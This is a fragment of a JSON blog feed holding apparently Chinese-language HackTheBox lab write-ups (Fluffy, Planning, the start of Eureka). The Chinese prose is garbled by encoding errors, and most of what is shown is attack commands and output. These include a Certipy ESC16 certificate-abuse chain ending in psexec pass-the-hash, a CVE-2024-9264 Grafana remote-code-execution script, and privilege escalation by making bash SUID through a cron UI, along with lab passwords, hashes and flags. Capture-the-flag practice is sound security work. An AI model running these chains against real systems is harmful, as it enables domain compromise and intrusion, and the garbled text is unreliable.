'ca_svc'\n[*] Successfully restored the old Key Credentials for 'ca_svc'\n[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8\n```\n\nä¸‹é¢è·Ÿç€åˆ©ç”¨é“¾æ¥çš„åšå³å¯\n\n```bash\nâœ certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -user 'ca_svc' read\n\n[*] Reading attributes for 'ca_svc':\n    cn                                  : certificate authority service\n    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb\n    name                                : certificate authority service\n    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103\n    sAMAccountName                      : ca_svc\n    servicePrincipalName                : ADCS/ca.fluffy.htb\n    userPrincipalName                   : ca_svc@fluffy.htb\n    userAccountControl                  : 66048\n    whenCreated                         : 2025-04-17T16:07:50+00:00\n    whenChanged                         : 2025-05-25T14:57:02+00:00\n```\n\n```bash\nâœ ntpdate -s 10.10.11.69 && certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'administrator@fluffy.htb' -user 'ca_svc' update\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user 'ca_svc':\n    userPrincipalName                   : administrator@fluffy.htb\n[*] Successfully updated 'ca_svc'\n\n```\n\n```bash\nâœ certipy req -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'\n\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Request ID is 43\n[*] Successfully requested certificate\n[*] Got certificate with UPN 'administrator@fluffy.htb'\n[*] Certificate has no object SID\n[*] Try using -sid to set the object SID or see the wiki for more details\n[*] Saving certificate and private key to 'administrator.pfx'\n[*] Wrote certificate and private key to 'administrator.pfx'\n```\n\n```bash\nâœ ntpdate -s 10.10.11.69 && certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user 'ca_svc':\n    userPrincipalName                   : ca_svc@fluffy.htb\n[*] Successfully updated 'ca_svc'\n```\n\n```bash\nâœ certipy auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip 10.10.11.69                                                                                                   \nCertipy v5.0.2 - by Oliver Lyak (ly4k)      \n                                                                                                                                                                                                                  \n[*] Certificate identities:                                                                                                                                                                                       \n[*]     SAN UPN: 'administrator@fluffy.htb'                                                              \n[*] Using principal: 'administrator@fluffy.htb'                                                                                                                                                                   \n[*] Trying to get TGT...                                                                                                                                                                                          \n[*] Got TGT\n[*] Saving credential cache to 'administrator.ccache'\n[*] Wrote credential cache to 'administrator.ccache' \n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e\n```\n\n```bash\nâœ psexec.py fluffy.htb/administrator@10.10.11.69 -hashes aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on 10.10.11.69.....\n[*] Found writable share ADMIN$\n[*] Uploading file VJlmOeTb.exe\n[*] Opening SVCManager on 10.10.11.69.....\n[*] Creating service trya on 10.10.11.69.....\n[*] Starting service trya.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.6893]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> \n\n```\n\n```bash\nC:\\Users\\Administrator\\Desktop> type root.txt\n03337de6b0f0f5188a76c3970006b97b\n```\n\n## æ€»ç»“\n\nCVE-2025-24071ï¼ŒADCSï¼ŒESC16ï¼ŒNTLM ä¸­ç»§",
            "url": "https://www.sunsetaction.top/2025/09/20/HackTheBoxSeason8 - Fluffy",
            "title": "HackTheBox - Machine - Fluffy",
            "summary": "Season8 Fluffy https://app.hackthebox.com/machines/Fluffy | Windows Â· Easy Machine Informationï¼šAs is common in real life Windows pentests, you will st...",
            "date_modified": "2025-05-25T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HackTheBox",
                "Windows",
                "ADCS",
                "ESC16",
                "Responder"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Planning",
            "content_html": "\n# Machine - Planning\n\n> https://app.hackthebox.com/machines/Planning | `Esay`\n> \n\n## å‰æœŸè¸©ç‚¹\n\n```bash\nâœ  Planning nmap -sT -min-rate 10000 -p- 10.10.11.68\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 00:56 EDT\nNmap scan report for planning.htb (10.10.11.68)\nHost is up (0.19s latency).\nNot shown: 65269 filtered tcp ports (no-response), 264 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 50.82 seconds\n```\n\n```bash\nâœ  Planning nmap -sU -min-rate 5000 -p- 10.10.11.68                                                                                                                                                                                \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 01:01 EDT\nWarning: 10.10.11.68 giving up on port because retransmission cap hit (10).\nNmap scan report for planning.htb (10.10.11.68)\nHost is up (4.5s latency).\nAll 65535 scanned ports on planning.htb (10.10.11.68) are in ignored states.\nNot shown: 65443 open|filtered udp ports (no-response), 92 closed udp ports (port-unreach)\n\nNmap done: 1 IP address (1 host up) scanned in 176.18 seconds\n```\n\n```bash\nâœ  Planning nmap -sT -A -T4 -O -p 22,80 10.10.11.68\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 00:59 EDT\nNmap scan report for planning.htb (10.10.11.68)\nHost is up (0.21s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)\n|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)\n80/tcp open  http    nginx 1.24.0 (Ubuntu)\n|_http-server-header: nginx/1.24.0 (Ubuntu)\n|_http-title: Edukate - Online Education Website\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   221.80 ms 10.10.16.1\n2   161.43 ms planning.htb (10.10.11.68)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.81 seconds\n```\n\næ”¶é›†åˆ°ä¸€ä¸ªé‚®ç®± `info@planning.htb`\n\n```bash\nâœ  Planning whatweb planning.htb\nhttp://planning.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@planning.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], JQuery[3.4.1], Script, Title[Edukate - Online Education Website], nginx[1.24.0]\n```\n\n## Web æ¸—é€\n\n### ä¿¡æ¯æ”¶é›†\n\nè®¿é—® `HTTP` æœåŠ¡ï¼Œé‡‡é›†æŒ‡çº¹\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image.png)\n\nå¯èƒ½æœ‰ç”¨çš„ä¸‰ä¸ªç”¨æˆ·å `Bob Moss` `Rose Mary` `Stella Haks`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image1.png)\n\n`Detail.php` é¡µé¢å¯ä»¥æ³¨å†Œï¼Œä½†æ˜¯è²Œä¼¼æ²¡ä»€ä¹ˆç”¨\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image2.png)\n\nç›®å½•æ‰«æ\n\n```bash\nâœ  Planning dirsearch -u http://planning.htb -x 404,429 -e php,zip,txt \n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/Planning/reports/http_planning.htb/_25-05-11_01-14-34.txt\n\nTarget: http://planning.htb/\n\n[01:14:34] Starting: \n[01:14:51] 200 -   12KB - /about.php\n[01:15:12] 200 -   10KB - /contact.php\n[01:15:13] 301 -  178B  - /css  ->  http://planning.htb/css/\n[01:15:24] 301 -  178B  - /img  ->  http://planning.htb/img/\n[01:15:27] 301 -  178B  - /js  ->  http://planning.htb/js/\n[01:15:27] 403 -  564B  - /js/\n[01:15:29] 301 -  178B  - /lib  ->  http://planning.htb/lib/\n[01:15:29] 403 -  564B  - /lib/\n```\n\nçˆ†ç ´ä¸€ä¸‹å­åŸŸå\n\n```bash\nâœ  Planning wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb -H 'Host:FUZZ.planning.htb'                                                                               \n********************************************************                                                                                                                                                                            \n* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                                                                                            \n********************************************************                                                                                                                                                                            \n                                                                                                                                                                                                                                    \nTarget: http://planning.htb/                                                                                                                                                                                                        \nTotal requests: 100000                                                                                                                                                                                                              \n                                                                                                                                                                                                                                    \n=====================================================================                                                                                                                                                               \nID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     \n=====================================================================    \n000024093:   302        2 L      2 W        29 Ch       \"grafana\"    \n```\n\nèƒ½æ‰¾åˆ°å« `grafana` çš„å­åŸŸåï¼Œæ·»åŠ åˆ° `hosts` æ–‡ä»¶\n\nè®¿é—®ä¸€ä¸‹ï¼Œç‰ˆæœ¬æ˜¯ `Grafana v11.0.0 (83b9528bce)`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image3.png)\n\n### Grafana\n\n> Grafana æ˜¯ä¸€ä¸ªå¼€æºçš„åº¦é‡åˆ†æå’Œå¯è§†åŒ–å·¥å…·ï¼Œæ”¯æŒå¤šç§æ•°æ®æºå¦‚ Graphiteã€InfluxDB ç­‰ã€‚å®‰è£…å®Œæˆåï¼ŒGrafana çš„é»˜è®¤ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯***admin***\n> \n\nå°è¯•ä¸‹é»˜è®¤å¯†ç ï¼Œæ˜¯å¤±è´¥çš„\n\næ‰¾ä¸€ä¸‹ç‰ˆæœ¬ç›¸å…³æ¼æ´\n\n1. https://github.com/nollium/CVE-2024-9264 å¯ä»¥è¿›è¡Œ LFI å’Œ RCE ï¼Œä½†æ˜¯è¦éªŒè¯å\n2. https://grafana.com/blog/2024/08/14/grafana-security-release-medium-severity-security-fix-for-cve-2024-6837/ XSS æ¼æ´\n\nç„¶åå‘ç°ï¼š\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image4.png)\n\n```bash\nAs is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r\n```\n\nå¾—åˆ°å¯†ç  `admin`/`0D5oT70Fq13EvB5r`\n\nå°è¯•åˆ©ç”¨ `CVE-2024-9264`\n\n```bash\n(Planning) âœ  CVE-2024-9264 git:(main) âœ— python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /etc/passwd http://grafana.planning.htb\n```\n\næˆåŠŸåˆ©ç”¨\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image5.png)\n\n```bash\n(Planning) âœ  CVE-2024-9264 git:(main) âœ— python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c whoami http://grafana.planning.htb\n[+] Logged in as admin:0D5oT70Fq13EvB5r\n[+] Executing command: whoami\n[+] Successfully ran duckdb query:\n[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('whoami >/tmp/grafana_cmd_output 2>&1 |'):\n[+] Successfully ran duckdb query:\n[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):\nroot\n```\n\næˆ‘ä»¬åœ¨ Docker ç¯å¢ƒä¸­\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image6.png)\n\nè¿›è¡Œåå¼¹ `shell`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image7.png)\n\n## Docker é€ƒé€¸\n\nåå¼¹ `shell` åå¯¹ `shell` è¿›è¡Œä¼˜åŒ– ï¼šhttps://www.sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/\n\nåœ¨ `env` å‘½ä»¤è¾“å‡ºä¸­ï¼Œèƒ½æ‰¾åˆ° \n\n```bash\nroot@7ce659d667d7:~# env    \n...      \nGF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!\nGF_SECURITY_ADMIN_USER=enzo\n...\n```\n\nå°è¯•ç”¨æ”¹å‡­æ®è¿›è¡Œ SSH ç™»å½•\n\n```bash\nâœ  Planning ssh enzo@planning.htb \nenzo@planning.htb's password: \nWelcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Sun May 11 06:26:45 AM UTC 2025\n\n  System load:           0.13\n  Usage of /:            77.6% of 6.30GB\n  Memory usage:          43%\n  Swap usage:            16%\n  Processes:             294\n  Users logged in:       1\n  IPv4 address for eth0: 10.10.11.68\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:4d58\n\n  => There are 43 zombie processes.\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\n1 additional security update can be applied with ESM Apps.\nLearn more about enabling ESM Apps service at https://ubuntu.com/esm\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sun May 11 06:27:42 2025 from 10.10.16.12\nenzo@planning:~$ \n```\n\næˆåŠŸè¿›å…¥â€¦\n\n## ææƒ - To Root\n\n### ä¿¡æ¯æ”¶é›†\n\nåœ¨å½“å‰ç›®å½•ä¸‹å¯ä»¥æ‰¾åˆ° `user.txt`\n\n```bash\nenzo@planning:~$ cat user.txt \n97cbc3d1ee1c848ab5255a90dc366206\n```\n\nä¸Šä¼  `Linpeas` æ”¶é›†ä¿¡æ¯\n\n```bash\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ SUID - Check easy privesc, exploits and write perms\nâ•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid\n-rwsr-xr-x 1 root root 19K Dec  2 11:59 /usr/lib/polkit-1/polkit-agent-helper-1\n-rwsr-xr-x 1 root root 335K Apr 22 11:51 /usr/lib/openssh/ssh-keysign\n-rwsr-xr-- 1 root messagebus 35K Aug  9  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n-rwsr-xr-x 1 root root 39K Dec  5 02:26 /usr/bin/umount  --->  BSD/Linux(08-1996)\n-rwsr-xr-x 1 root root 51K Dec  5 02:26 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8\n-rwsr-xr-x 1 root root 272K Apr  8  2024 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable\n-rwsr-xr-x 1 root root 63K May 30  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)\n-rwsr-xr-x 1 root root 44K May 30  2024 /usr/bin/chsh\n-rwsr-xr-x 1 root root 40K May 30  2024 /usr/bin/newgrp  --->  HP-UX_10.20\n-rwsr-xr-x 1 root root 72K May 30  2024 /usr/bin/chfn  --->  SuSE_9.3/10\n-rwsr-xr-x 1 root root 39K Apr  8  2024 /usr/bin/fusermount3\n-rwsr-xr-x 1 root root 55K Dec  5 02:26 /usr/bin/su\n-rwsr-xr-x 1 root root 75K May 30  2024 /usr/bin/gpasswd\n-rwsr-xr-x 1 root root 1.4M May 11 04:23 /tmp/bash\n```\n\n```bash\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ Active Ports\nâ•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:37777         0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -\ntcp6       0      0 :::22                   :::*                    LISTEN      -\n```\n\næ³¨æ„åˆ°å¾ˆå¤šåªæœ‰æœ¬æœºå¼€æ”¾çš„ç«¯å£ï¼Œ3000 æ˜¯ Grafanaï¼Œ`8000` ä¸æ¸…æ¥š\n\nå°† `8000`ç«¯å£è½¬å‘å‡ºå»\n\n```bash\nenzo@planning:/tmp$ ./socat TCP-LISTEN:8001,fork tcp4:127.0.0.1:8000 &\n[1] 2124\n```\n\néœ€è¦è´¦å·å¯†ç ï¼Œ`enzo`çš„å‡­æ®ä¸æ­£ç¡®\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image8.png)\n\nå›åˆ° enzo ä¸­å†å¯»æ‰¾ä¸€ä¸‹ä¿¡æ¯\n\nåœ¨ `/opt/crontabs` æ‰¾åˆ° `crontab.db`  \n\n```bash\nenzo@planning:/opt/crontabs$ cat crontab.db \n{\"name\":\"Grafana backup\",\"command\":\"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz\",\"schedule\":\"@daily\",\"stopped\":false,\"timestamp\":\"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)\",\"logging\":\"false\",\"mailing\":{},\"created\":1740774983276,\"saved\":false,\"_id\":\"GTI22PpoJNtRKg0W\"}\n{\"name\":\"Cleanup\",\"command\":\"/root/scripts/cleanup.sh\",\"schedule\":\"* * * * *\",\"stopped\":false,\"timestamp\":\"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)\",\"logging\":\"false\",\"mailing\":{},\"created\":1740849309992,\"saved\":false,\"_id\":\"gNIRXh1WIc9K7BYX\"}\n```\n\nè¿™äº›æ˜¯è®¡åˆ’ä»»åŠ¡\n\n```bash\n# Grafana Docker é•œåƒå¤‡ä»½ï¼Œæ¯å¤© 00:00 æ‰§è¡Œ\n0 0 * * * root /usr/bin/docker save root_grafana -o /var/backups/grafana.tar \\\n  && /usr/bin/gzip /var/backups/grafana.tar \\\n  && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz \\\n  && rm /var/backups/grafana.tar.gz\n```\n\n```bash\n# æ¯åˆ†é’Ÿè¿è¡Œä¸€æ¬¡æ¸…ç†è„šæœ¬\n* * * * * root /root/scripts/cleanup.sh\n```\n\nå…¶ä¸­ `Grafana Docker` è®¡åˆ’ä»»åŠ¡ä¸­èƒ½å¾—åˆ°ä¸€ä¸ªå¯†ç  `P4ssw0rdS0pRi0T3c`\n\næˆ‘ä»¬åˆ° `Web` ä¸Šå°è¯•ä½¿ç”¨è¯¥å¯†ç è¿›è¡Œç™»å½•ï¼Œæœ€åä½¿ç”¨ `root:P4ssw0rdS0pRi0T3c` æˆåŠŸè¿›å…¥åå°\n\n### Crontab ææƒ\n\nåå°æ˜¯ `Crontab UI`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image9.png)\n\næˆ‘ä»¬çœ‹åˆ°ä¸Šé¢çš„è®¡åˆ’ä»»åŠ¡æ˜¯ä»¥ `root` æ‰§è¡Œçš„ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œæ–°å»ºè®¡åˆ’ä»»åŠ¡ï¼ˆè¿™é‡Œæ–¹æ³•å¾ˆå¤šäº†ï¼Œéšä¾¿ rootï¼‰\n\nç›´æ¥è¿›è¡Œåå¼¹ `shell` ï¼ˆå¤±è´¥ï¼‰\n\nç»™ `/bin/bash` è®¾ç½® `sid`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image10.png)\n\nè·å– Root\n\n```bash\nenzo@planning:/opt/crontabs$ ls -al /bin/bash\n-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash\nenzo@planning:/opt/crontabs$ /bin/bash -p\nbash-5.2# id\nuid=1000(enzo) gid=1000(enzo) euid=0(root) groups=1000(enzo)\nbash-5.2# cd /root\nbash-5.2# ls\nroot.txt  scripts\nbash-5.2# cat root.txt \n4f1ad996a454ef10623bfb578c0134ba\n```\n\n## æ€»ç»“\n\næ‰“çš„ç³Šé‡Œç³Šæ¶‚çš„ï¼Œå¹¶ä¸ç®—éš¾ã€‚ä½†æ˜¯å‡­æ®æ”¾åœ¨ **Machine Information** é‡Œé¢æˆ‘æ˜¯çœŸæƒ³ä¸åˆ°â€¦\n\næ¯ä¸ªç‚¹éƒ½æ„Ÿè§‰æ²¡æœ‰ä¸²è”èµ·æ¥ï¼Œå‰²è£‚æ„Ÿä¸¥é‡ã€‚",
            "url": "https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Planning",
            "title": "HackTheBox - Machine - Planning",
            "summary": "Machine Planning https://app.hackthebox.com/machines/Planning | Esay å‰æœŸè¸©ç‚¹ æ”¶é›†åˆ°ä¸€ä¸ªé‚®ç®± info@planning.htb Web æ¸—é€ ä¿¡æ¯æ”¶é›† è®¿é—® HTTP æœåŠ¡ï¼Œé‡‡é›†æŒ‡çº¹ å¯èƒ½æœ‰ç”¨çš„ä¸‰ä¸ªç”¨æˆ·å Bob Moss Ro...",
            "date_modified": "2025-05-11T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HackTheBox",
                "Linuxé¶æœº",
                "Grafana",
                "Crontab"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Eureka",
            "content_html": "# Machine - Eureka\n\n> https://app.hackthebox.com/machines/Eureka | `Hard`\n> \n\nPSï¼šå°¤é‡Œå¡å‘åŠ¨ï¼æ‰€æœ‰å¥‡è§‚å»ºé€ æé€Ÿ 30% !\n\n## å‰æœŸè¸©ç‚¹\n\n```bash\nâœ  Eureka nmap -sT -min-rate 10000 -p- 10.10.11.66\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 02:28 EDT\nNmap scan report for 10.10.11.66\nHost is up (0.15s latency).\nNot shown: 65493 filtered tcp ports (no-response), 40 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n```\n\n```bash\nâœ  Eureka nmap -sT -A -T4 -O -p 22,80 10.10.11.66\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 02:36 EDT\nNmap scan report for eureka.htb (10.10.11.66)\nHost is up (0.19s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)\n|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)\n|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://furni.htb/\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   442.32 ms 10.10.16.1\n2   139.60 ms eureka.htb (10.10.11.66)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 33.95 seconds\n```\n\n## Web æ¸—é€\n\n### ä¿¡æ¯æ”¶é›†\n\nWhatWeb\n\n```bash\nâœ  Eureka whatweb furni.htb                                                                             \nhttp://furni.htb [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.66], Meta-Author[Untree.co], Script, Title[Furni | Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image.png)\n\né¡µé¢ä¸Šçš„ä¸€äº›æ“ä½œè¦è¿›è¡Œç™»é™†åæ‰èƒ½è¿›è¡Œæ“ä½œ\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image1.png)\n\næŠ“ä¸ªåŒ…åˆ†æä¸€ä¸‹æ¡†æ¶\n\n```bash\nâœ  Eureka curl -i http://furni.htb                                                                                                                                                                                                  \nHTTP/1.1 200 OK                                                                                                                                                                                                                     \nServer: nginx/1.18.0 (Ubuntu)                                                                                                                                                                                                       \nDate: Sun, 27 Apr 2025 06:48:57 GMT                                                                                                                                                                                                 \nContent-Type: text/html;charset=UTF-8                                                                                                                                                                                               \nTransfer-Encoding: chunked                                                                                                                                                                                                          \nConnection: keep-alive                                                                                                                                                                                                              \nVary: Origin                                                                                                                                                                                                                        \nVary: Access-Control-Request-Method                                                                                                                                                                                                 \nVary: Access-Control-Request-Headers                                                                                                                                                                                                \nX-Content-Type-Options: nosniff\nX-XSS-Protection: 0\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\nPragma: no-cache\nExpires: 0\nX-Frame-Options: DENY\nContent-Language: en-US\n```\n\n**nginx** æ˜¯å‰ç«¯ Web Serverï¼ˆåä»£æˆ–ç›´æ¥æœåŠ¡ï¼‰ã€‚\n\n**Content-Type æ˜¯ text/html;charset=UTF-8**ï¼Œä¸€èˆ¬å°±æ˜¯æ ‡å‡†ç½‘é¡µã€‚\n\n**X-Content-Type-Options: nosniff** å’Œ **X-Frame-Options: DENY** è¿™äº›æ˜¯å¸¸è§çš„å®‰å…¨ HTTP å¤´ï¼Œä¸€èˆ¬ Javaã€Spring Bootã€æˆ–è€… ASP.NET Core è¿™ç§ç°ä»£åç«¯æ¡†æ¶ä¼šåŠ ä¸Šè¿™äº›å¤´ã€‚\n\n**Cache-Control: no-cache, no-store, max-age=0, must-revalidate**ï¼Œè¿™ç§å¼ºåˆ¶ç¦æ­¢ç¼“å­˜çš„ç­–ç•¥ï¼Œä¹Ÿå¸¸è§äº **Spring Boot**ï¼Œå°¤å…¶æ˜¯é»˜è®¤æ¨¡æ¿ç”Ÿæˆçš„ç½‘ç«™ã€‚\n\nå†åŠ ä¸Š `Content-Language: en-US`ï¼Œå’Œ `Pragma: no-cache` è¿™ç§å†™æ³•ï¼Œä¹Ÿå¾ˆåƒ Java ç³»åˆ—åº”ç”¨ã€‚\n\n**æ‰€ä»¥ï¼Œç»¼åˆæ¥çœ‹ï¼Œåç«¯å¾ˆå¯èƒ½æ˜¯ Java ç³»çš„æ¡†æ¶ï¼Œææœ‰å¯èƒ½æ˜¯**ï¼š**Spring Boot**\n\n---\n\nç›®å½•æ‰«æä¹Ÿç¡®å®šäº†è¿™ä¸€ç‚¹ï¼Œæ‰«æå‡ºæ¥äº†`/actuator` ç›®å½•ï¼Œå¹¶ä¸”è¿”å› 200\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image2.png)\n\n### Spring acturtor æœªæˆæƒ\n\nå­˜åœ¨æœªæˆæƒè®¿é—®\n\n```bash\ncurl 